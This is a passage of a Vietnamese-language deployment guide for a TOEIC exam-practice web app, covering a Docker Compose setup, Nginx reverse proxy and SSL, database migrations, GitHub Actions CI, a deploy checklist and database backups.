      - Jwt__Audience=https://toeicmaster.com
      - Cors__AllowedOrigins__0=https://toeicmaster.com
    volumes: [media:/app/wwwroot/uploads]   # ← media phải nằm ngoài container
    depends_on: [sqlserver, redis]
    restart: unless-stopped

  frontend:
    build: { context: ., dockerfile: frontend/Dockerfile }
    ports: ["80:80", "443:443"]
    depends_on: [api]
    restart: unless-stopped

volumes: { sqlserver_data: , redis_data: , media: }
```

**Ba điểm quan trọng:**
1. **Không có `ports`** cho SQL Server và Redis — chỉ `frontend` mở ra Internet
2. Container gọi nhau bằng **tên service** (`Server=sqlserver`, `redis:6379`), không phải `localhost`
3. **`media` volume bắt buộc** — không có nó thì mọi file audio/ảnh đã upload **mất sạch** mỗi lần deploy lại

Tạo file `.env` trên VPS (không commit) chứa `DB_PASSWORD`, `REDIS_PASSWORD`, `JWT_SECRET`.

## 5.6 · Nginx

```nginx
server {
    listen 443 ssl http2;
    server_name toeicmaster.com;

    ssl_certificate     /etc/letsencrypt/live/toeicmaster.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/toeicmaster.com/privkey.pem;

    location / {
        root /usr/share/nginx/html;
        try_files $uri $uri/ /index.html;      # ← BẮT BUỘC cho SPA
    }

    location /api/ {
        proxy_pass http://api:8080;
        proxy_set_header Host              $host;
        proxy_set_header X-Real-IP         $remote_addr;
        proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    client_max_body_size 200M;                 # CM upload ZIP audio đề thi

    # Audio đề thi — cho phép tua (seek) và cache
    location /uploads/ {
        proxy_pass http://api:8080;
        add_header Accept-Ranges bytes;
        expires 7d;
    }
}
server {                                        # ép HTTP → HTTPS
    listen 80;
    server_name toeicmaster.com www.toeicmaster.com;
    return 301 https://$host$request_uri;
}
```

**Kèm theo, phải bật ở phía .NET** — nếu không, rate limit theo IP sai hoàn toàn vì mọi request đều
mang IP của Nginx:
```csharp
app.UseForwardedHeaders(new ForwardedHeadersOptions {
    ForwardedHeaders = ForwardedHeaders.XForwardedFor | ForwardedHeaders.XForwardedProto
});
```

## 5.7 · SSL

```bash
sudo apt install certbot python3-certbot-nginx
sudo certbot --nginx -d toeicmaster.com -d www.toeicmaster.com
sudo certbot renew --dry-run          # kiểm tra gia hạn tự động
```

Chứng chỉ Let's Encrypt hạn **90 ngày**, Certbot tự cài cron gia hạn.

## 5.8 · Migration lên DB production

```bash
# Cách an toàn nhất: sinh script, đọc, rồi chạy
dotnet ef migrations script --idempotent \
  --project backend/ToeicMasterPro.Infrastructure \
  --startup-project backend/ToeicMasterPro.API \
  -o migrate.sql
# Đọc migrate.sql rồi chạy bằng sqlcmd
```

`--idempotent` sinh script có kiểm tra "migration này đã chạy chưa" → chạy nhiều lần cũng an toàn.

## 5.9 · CI với GitHub Actions

`.github/workflows/ci.yml`:
```yaml
name: CI
on: [push, pull_request]
jobs:
  backend:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-dotnet@v4
        with: { dotnet-version: '8.0.x' }
      - run: dotnet restore
      - run: dotnet build --no-restore
      - run: dotnet test --no-build --verbosity normal
  frontend:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '22', cache: 'npm', cache-dependency-path: frontend/package-lock.json }
      - run: npm ci
        working-directory: frontend
      - run: npm run build
        working-directory: frontend
```

Đây là **thứ rẻ nhất, giá trị cao nhất** trong toàn bộ danh sách. 30 test đang nằm không.

## 5.10 · Checklist deploy

```
□ 1.  VPS 4GB Ubuntu 22.04, đã bảo mật SSH + ufw
□ 2.  Docker + Docker Compose
□ 3.  Tên miền, bản ghi A trỏ về IP
✅ 4.  ĐÃ SỬA XONG toàn bộ Giai đoạn 1 — 8/8 (2026-08-06)
□ 5.  Dockerfile API + frontend
□ 6.  docker-compose.prod.yml + file .env trên VPS
□ 7.  Nginx + Certbot, SSL chạy được
□ 8.  Migration lên DB production
□ 9.  docker compose up -d, kiểm tra logs
□ 10. Smoke test: đăng ký → đăng nhập → thi thử → nộp bài → xem kết quả
□ 11. ⭐ THI MỘT ĐỀ ĐẦY ĐỦ TRÊN ĐIỆN THOẠI, DÙNG 4G
□ 12. Backup DB tự động (cron dump + đẩy sang nơi khác)
□ 13. CI GitHub Actions
```

> ⭐ **Bước 11 là bước quan trọng nhất và chưa ai làm.** Bốn thứ dễ vỡ:
>
> 1. **Access token hết hạn giữa bài thi** — nếu chưa sửa mục 2.1 thì bạn sẽ bị đá ra ở phút 61 và
>    thấy tận mắt vì sao nó nghiêm trọng
> 2. **Audio Part 3/4 trên iOS Safari** — Safari chặn autoplay, bắt buộc phải có thao tác chạm
> 3. **Tải audio qua 4G** — file 30–50MB, chậm giữa bài thi là hỏng cả lần thi
> 4. **Reading Part 7 trên màn hình hẹp** — passage dài + 5 câu hỏi trên màn 6 inch
>
> Phát hiện bốn lỗi này ở tuần 6 dễ sửa hơn tuần 12 rất nhiều.

## 5.11 · Sau khi deploy — vận hành

```bash
# Backup DB hằng ngày (thêm vào crontab)
0 3 * * * docker exec toeic_sqlserver /opt/mssql-tools18/bin/sqlcmd \
  -S localhost -U sa -P "$DB_PASSWORD" -C \
  -Q "BACKUP DATABASE ToeicMasterPro TO DISK='/var/opt/mssql/backup/db.bak' WITH INIT"
```

> ⚠️ **Backup nằm cùng máy với DB thì không phải backup.** Phải đẩy sang nơi khác (rsync sang máy
> khác, hoặc upload lên object storage). Và **phải thử phục hồi ít nhất một lần** — backup chưa từng
> được restore là backup chưa được chứng minh.

**Nên có thêm:**
- Endpoint `/health` để giám sát biết app còn sống (dự án hiện **chưa có**)
- Uptime monitor miễn phí (UptimeRobot) ping mỗi 5 phút
- Xem log: `docker compose logs -f api`
